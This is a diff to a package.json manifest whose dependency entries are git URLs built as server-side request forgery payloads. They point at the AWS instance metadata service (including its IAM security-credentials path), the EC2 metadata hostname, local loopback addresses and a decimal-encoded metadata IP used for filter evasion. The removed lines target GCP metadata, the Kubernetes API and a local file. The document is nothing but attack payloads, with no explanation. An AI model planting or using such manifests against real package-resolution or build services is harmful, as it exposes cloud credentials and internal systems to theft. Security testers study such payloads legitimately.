@@ -3,9 +3,12 @@
   "version": "0.1.0",
   "dependencies": {
     "lodash": "^4.17.15",
-    "ssrf-aws": "git+http://169.254.169.254/latest/meta-data/#main",
-    "ssrf-gcp": "git+http://metadata.google.internal/computeMetadata/v1/#main",
-    "ssrf-k8s": "git+http://kubernetes.default.svc/#main",
-    "ssrf-local": "git+file:///etc/hostname/#main"
+    "ssrf-aws2": "git+http://169.254.169.254/latest/meta-data/iam/security-credentials/#main",
+    "ssrf-aws-imds2": "git+http://169.254.169.254/latest/meta-data/iam/#main",
+    "ssrf-ec2": "git+http://instance-data.ec2.internal/latest/meta-data/#main",
+    "ssrf-127": "git+http://127.0.0.1:80/#main",
+    "ssrf-localhost": "git+http://localhost:80/#main",
+    "ssrf-0": "git+http://0.0.0.0:80/#main",
+    "ssrf-decimal": "git+http://2852039166/#main"
   }
 }
